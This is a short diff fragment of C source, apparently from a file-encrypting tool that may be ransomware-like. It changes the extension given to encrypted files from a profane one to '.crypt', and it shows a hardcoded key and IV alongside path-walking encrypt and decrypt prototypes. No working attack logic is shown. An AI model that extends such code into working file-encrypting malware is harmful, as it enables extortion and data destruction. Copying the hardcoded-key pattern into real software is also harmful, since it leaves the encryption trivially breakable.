@@ -10,7 +10,7 @@
 
 char* iv = "qwertyuiopasd";
 char* key = "asdfghjklzxcvbnmqwertyuiopasdfgh";
-char* ext = ".fuck";
+char* ext = ".crypt";
 
 int VisitCrypt(char* path);
 int VisitDecrypt(char* path);
